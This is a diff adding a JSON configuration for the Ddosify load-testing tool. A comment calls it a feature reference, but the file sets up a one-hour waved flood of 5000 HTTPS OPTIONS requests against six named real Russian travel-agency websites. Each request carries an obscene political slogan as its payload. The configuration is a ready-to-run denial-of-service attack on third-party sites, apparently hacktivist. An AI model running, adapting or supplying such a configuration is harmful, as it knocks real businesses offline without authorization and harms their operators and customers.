@@ -1,0 +1,87 @@
+// This file contains full features of Ddosify as a reference. Don't use it directly.
+{
+    "request_count": 5000,
+    "load_type": "waved",
+    "duration": 3600,
+    "output": "stdout",
+    "steps": [
+        {
+            "id": 1,
+            "url": "https://turskidki.ru/",
+            "protocol": "https",
+            "method": "OPTIONS",
+            "payload": "Русский корабль иди нахуй!",
+            "others": {
+                "keep-alive": true,
+                "disableCompression": false,
+                "h2": false,
+                "disable-redirect": true
+            }
+        },
+		{
+            "id": 2,
+            "url": "https://anex-tour.ru/",
+            "protocol": "https",
+            "method": "OPTIONS",
+            "payload": "Русский корабль иди нахуй!",
+            "others": {
+                "keep-alive": true,
+                "disableCompression": false,
+                "h2": false,
+                "disable-redirect": true
+            }
+        },
+		{
+            "id": 3,
+            "url": "https://www.bankturov.ru/",
+            "protocol": "https",
+            "method": "OPTIONS",
+            "payload": "Русский корабль иди нахуй!",
+            "others": {
+                "keep-alive": true,
+                "disableCompression": false,
+                "h2": false,
+                "disable-redirect": true
+            }
+        },
+		{
+            "id": 4,
+            "url": "https://www.1001tur.ru/",
+            "protocol": "https",
+            "method": "OPTIONS",
+            "payload": "Русский корабль иди нахуй!",
+            "others": {
+                "keep-alive": true,
+                "disableCompression": false,
+                "h2": false,
+                "disable-redirect": true
+            }
+        },
+		{
+            "id": 5,
+            "url": "https://tours.tutu.ru/",
+            "protocol": "https",
+            "method": "OPTIONS",
+            "payload": "Русский корабль иди нахуй!",
+            "others": {
+                "keep-alive": true,
+                "disableCompression": false,
+                "h2": false,
+                "disable-redirect": true
+            }
+        },
+		{
+            "id": 6,
+            "url": "https://travelata.ru/",
+            "protocol": "https",
+            "method": "OPTIONS",
+            "payload": "Русский корабль иди нахуй!",
+            "others": {
+                "keep-alive": true,
+                "disableCompression": false,
+                "h2": false,
+                "disable-redirect": true
+            }
+        }
+    ]
+}
